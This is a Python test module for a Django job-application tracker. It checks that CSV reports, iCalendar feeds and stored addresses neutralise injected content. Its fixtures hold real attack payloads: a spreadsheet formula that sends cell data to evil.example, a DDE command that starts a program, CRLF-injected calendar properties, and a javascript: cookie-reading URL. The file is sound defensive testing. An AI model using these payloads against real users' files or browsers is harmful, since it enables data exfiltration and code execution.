"""What leaves Postulo cannot carry instructions for whatever opens it (#218).

Three exports hand a file or a feed to another program: a CSV to a spreadsheet, an
iCalendar feed to every calendar subscribed to it, and a stored address to a browser that
draws it as a link. In all three the text can have come from somewhere the person never
chose -- a posting captured off a stranger's page, a contact sent by an API client -- and
in all three the receiving program reads some of it as instructions rather than as words.

These are the boundary tests: the value goes in where it really arrives, and the file that
comes out is read the way the other program would read it.
"""

from __future__ import annotations

import csv
import datetime as dt
import io
import json

import pytest
from django.urls import reverse
from django.utils import timezone

from postulo.api.models import ApiToken
from postulo.applications.models import Application, InterviewKind, Status
from postulo.applications.services import schedule_interview
from postulo.jobs.models import Company, Contact, JobPosting

pytestmark = pytest.mark.django_db


def issue(user, *scopes):
    _record, raw = ApiToken.issue(user, "Agent", scopes=scopes)
    return {"HTTP_AUTHORIZATION": f"Bearer {raw}"}


def post(client, path, payload, **headers):
    return client.post(path, data=json.dumps(payload), content_type="application/json", **headers)


def patch(client, path, payload, **headers):
    return client.patch(path, data=json.dumps(payload), content_type="application/json", **headers)


# ------------------------------------------------------- the report, in a spreadsheet

#: What a posting would be titled to make the office's spreadsheet fetch a URL holding
#: whatever is in the cell beside it.
FORMULA = '=HYPERLINK("https://evil.example/?"&A2,"Open me")'

#: The other half of the same trick: the DDE payload that starts a program instead.
DDE = '=cmd|" /c calc"!A1'


def test_a_formula_in_a_title_reaches_the_report_csv_as_text(client, user):
    """The report is handed to an employment office and opened in a spreadsheet."""
    bearer = issue(user, "write")
    response = post(
        client,
        "/api/v1/applications",
        {"company_name": DDE, "title": FORMULA, "status": "applied"},
        **bearer,
    )
    assert response.status_code == 201

    client.force_login(user)
    text = client.get(reverse("applications:report_csv")).content.decode()

    cells = [cell for row in csv.reader(io.StringIO(text)) for cell in row]
    assert f"'{FORMULA}" in cells, "the title is there, and it is text"
    assert f"'{DDE}" in cells
    assert not any(cell.startswith(("=", "+", "-", "@", "\t", "\r")) for cell in cells)


def test_the_csv_template_is_written_by_the_same_rule():
    """The blank Postulo hands out goes through the rule, so the rule has one home."""
    from postulo.core import csv_import, spreadsheets

    cells = [cell for row in csv.reader(io.StringIO(csv_import.template_csv())) for cell in row]

    assert cells and cells == [spreadsheets.cell(value) for value in cells]


# --------------------------------------------------------- the calendar feeds

#: A contact's name that would end the ``ATTENDEE`` line and start a property of its own
#: in every calendar subscribed to the feed.
INJECTED_NAME = "Cave Johnson\r\nBEGIN:VALARM\r\nACTION:AUDIO\r\nTRIGGER:PT0S\r\nEND:VALARM"


@pytest.fixture
def interview_with_a_bent_contact(user):
    company = Company.objects.create(owner=user, name="Aperture Science")
    contact = Contact.objects.create(
        owner=user,
        company=company,
        name=INJECTED_NAME,
        role="CEO\rATTACH:https://evil.example/x",
        email="cave@aperture.test",
    )
    posting = JobPosting.objects.create(owner=user, company=company, title="Test Engineer")
    application = Application.objects.create(owner=user, posting=posting, status=Status.APPLIED)
    return schedule_interview(
        application,
        kind=InterviewKind.VIDEO,
        starts_at=timezone.now() + dt.timedelta(days=2),
        contacts=[contact],
    )


def assert_only_the_event_is_there(text: str) -> None:
    """The document holds one calendar and one event, and nothing else begins or ends."""
    lines = text.split("\r\n")
    assert lines[0] == "BEGIN:VCALENDAR"
    assert [line for line in lines if line.startswith("BEGIN:")] == [
        "BEGIN:VCALENDAR",
        "BEGIN:VEVENT",
    ]
    assert [line for line in lines if line.startswith("END:")] == ["END:VEVENT", "END:VCALENDAR"]
    assert "ACTION:AUDIO" not in lines and "TRIGGER:PT0S" not in lines
    assert not any(line.startswith("ATTACH") for line in lines)


def test_a_contact_cannot_add_lines_to_the_diary_feed(client, user, interview_with_a_bent_contact):
    client.force_login(user)

    text = client.get(reverse("applications:interview_calendar")).content.decode()

    assert_only_the_event_is_there(text)
    assert any(line.startswith("ATTENDEE;CN=") for line in text.split("\r\n"))


def test_a_contact_cannot_add_lines_to_the_api_feed(client, user, interview_with_a_bent_contact):
    text = client.get("/api/v1/interviews/calendar.ics", **issue(user, "read")).content.decode()

    assert_only_the_event_is_there(text)


def test_one_interviews_own_file_is_held_to_the_same_rule(
    client, user, interview_with_a_bent_contact
):
    client.force_login(user)
    url = reverse("applications:interview_ics", args=[interview_with_a_bent_contact.pk])

    assert_only_the_event_is_there(client.get(url).content.decode())


# -------------------------------------------------------- addresses from the API

SCRIPT = "javascript:alert(document.cookie)"


def test_a_javascript_company_address_is_refused_rather_than_stored(client, user):
    bearer = issue(user, "write", "read")

    response = post(client, "/api/v1/companies", {"name": "Aperture", "website": SCRIPT}, **bearer)

    assert response.status_code == 422, "a refusal the client can read, never a 500"
    assert "website" in json.dumps(response.json()), "and it says which field"
    assert not Company.objects.filter(website=SCRIPT).exists()


def test_a_javascript_address_cannot_be_patched_in_later(client, user):
    bearer = issue(user, "write", "read")
    made = post(client, "/api/v1/companies", {"name": "Aperture"}, **bearer).json()

    response = patch(client, f"/api/v1/companies/{made['id']}", {"careers_url": SCRIPT}, **bearer)

    assert response.status_code == 422
    assert Company.objects.get(pk=made["id"]).careers_url == ""


def test_a_javascript_listing_address_is_refused(client, user):
    bearer = issue(user, "write", "read")

    payload = {"company_name": "Initech", "title": "Dev", "url": SCRIPT}
    response = post(client, "/api/v1/listings", payload, **bearer)

    assert response.status_code == 422
    assert not JobPosting.objects.filter(url=SCRIPT).exists()


def test_a_javascript_profile_for_a_contact_is_refused(client, user):
    bearer = issue(user, "write", "read")
    made = post(client, "/api/v1/companies", {"name": "Aperture"}, **bearer).json()

    response = post(
        client,
        f"/api/v1/companies/{made['id']}/contacts",
        {"name": "Cave Johnson", "linkedin_url": SCRIPT},
        **bearer,
    )

    assert response.status_code == 422
    assert not Contact.objects.exists(), "nothing half-made either"


def test_a_capture_cannot_be_filed_against_a_javascript_address(client, user):
    """`html` supplied means nothing is fetched, so the schema is the only check there is."""
    bearer = issue(user, "captures")

    response = post(
        client,
        "/api/v1/captures",
        {"url": SCRIPT, "html": "<html><body><h1>A role</h1></body></html>"},
        **bearer,
    )

    assert response.status_code == 422
    assert "http" in json.dumps(response.json()), "and it says what is allowed"


def test_a_source_cannot_hand_back_a_javascript_address(user):
    """A plugin is third-party code; the schema every source's output passes is the gate."""
    from postulo.plugins.base import JobPostingData

    with pytest.raises(ValueError, match="http"):
        JobPostingData(title="A role", url=SCRIPT)

    assert JobPostingData(title="A role", url="https://example.org/j/1").url
